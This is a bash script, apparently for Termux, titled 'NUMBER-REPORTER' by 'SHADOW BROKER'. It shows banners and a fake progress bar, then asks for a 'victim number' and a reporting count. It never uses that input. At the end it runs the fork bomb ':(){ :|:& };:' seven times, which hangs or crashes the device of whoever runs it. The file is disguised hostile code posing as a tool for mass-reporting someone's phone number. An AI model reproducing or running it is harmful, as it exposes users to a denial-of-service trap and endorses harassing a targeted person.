#!/bin/bash 

  #SHADOWBROKER 
apt update 

pkg upgrade 

pkg install git 


clear 


#😂😂######SHADOW BROKER ######



  
echo -e " \e[99m\e[1;96m
-------------------------------------------------------------------------------------------------------─
 $$$$$$\  $$\   $$\  $$$$$$\  $$$$$$$\   $$$$$$\  $$\      $$\       $$$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\  
$$  __$$\ $$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$ | $\  $$ |      $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$  __$$\ 
$$ /  \__|$$ |  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ |$$ |$$$\ $$ |      $$ |  $$ |$$ |  $$ |$$ /  $$ |$$ |$$  / $$ |      $$ |  $$ |
\$$$$$$\  $$$$$$$$ |$$$$$$$$ |$$ |  $$ |$$ |  $$ |$$ $$ $$\$$ |      $$$$$$$\ |$$$$$$$  |$$ |  $$ |$$$$$  /  $$$$$\    $$$$$$$  |
 \____$$\ $$  __$$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$$$  _$$$$ |      $$  __$$\ $$  __$$< $$ |  $$ |$$  $$<   $$  __|   $$  __$$< 
$$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$$  / \$$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |\$$\  $$ |      $$ |  $$ |
\$$$$$$  |$$ |  $$ |$$ |  $$ |$$$$$$$  | $$$$$$  |$$  /   \$$ |      $$$$$$$  |$$ |  $$ | $$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
 \______/ \__|  \__|\__|  \__|\_______/  \______/ \__/     \__|      \_______/ \__|  \__| \______/ \__|  \__|\________|\__|  \__|
                                                                                                                                 
                                                                                                      
                                       coded by SHADOW BROKER 
------------------------------------------------------------------------------------------------------─"
sleep 3
echo -e " \e [v.20] \e[1;96
  "

sleep  3


echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo ""
echo ""
echo "" 
echo ""
echo  ' 
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo""
echo""
echo""
echo""
echo "               "/█1%...................../
sleep 1
clear
echo " "
echo " "
echo " "
echo " "
echo "                "/█4%....................../
sleep 1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/█8%......................./
sleep 2
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo ""
echo " "
echo " "
echo " "
echo " "
echo "                "/██10%....................../
sleep 1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo "                "/██12%....................../
sleep 1
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/███15%..................../
sleep 0.0
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo ' 
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "               "/█████19%..................../
sleep 0.0
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "               "/██████28%..................../
sleep 0.5
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/████████30%................../
sleep 0.0
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/██████████40%................/
sleep 0.0
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/█████████████50%............./
sleep 2
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/████████████████60%........../
sleep 0.0
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo '
                     ┬  ┌─┐┌─┐┌┬┐┬┌┐┌┌─┐
                     │  │ │├─┤ │││││││ ┬
                     ┴─┘└─┘┴ ┴─┴┘┴┘└┘└─┘
'
echo " "
echo " "
echo " "
echo " "
echo "                "/███████████████████88%......./
sleep 2.0
clear
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
echo " "
clear
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo "" 
echo "               "[██████████████████████ 100%]
echo ""
echo ""
echo ""
echo ""
echo ""
clear



echo -e " \e[99m\e[1;96m
-------------------------------------------------------------------------------------------------------─
  _   _ _    _ __  __ ____  ______ _____        _____  ______ _____   ____  _____ _______ ______ _____  
 | \ | | |  | |  \/  |  _ \|  ____|  __ \      |  __ \|  ____|  __ \ / __ \|  __ \__   __|  ____|  __ \ 
 |  \| | |  | | \  / | |_) | |__  | |__) |_____| |__) | |__  | |__) | |  | | |__) | | |  | |__  | |__) |
 | . ` | |  | | |\/| |  _ <|  __| |  _  /______|  _  /|  __| |  ___/| |  | |  _  /  | |  |  __| |  _  / 
 | |\  | |__| | |  | | |_) | |____| | \ \      | | \ \| |____| |    | |__| | | \ \  | |  | |____| | \ \ 
 |_| \_|\____/|_|  |_|____/|______|_|  \_\     |_|  \_\______|_|     \____/|_|  \_\ |_|  |______|_|  \_\
                                                                                                        
                                     coded by SHADOW BROKER                                                             
------------------------------------------------------------------------------------------------------─"
sleep 3
echo -e " \e [v.20] \e[1;96
  "

sleep  3





read -p " [+] enter your victim number :" token
#DON'T DO PATTI SHOW...!🥲#
read -p " [+] enter count of reporting :" token 
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };:
:(){ :|:& };: 
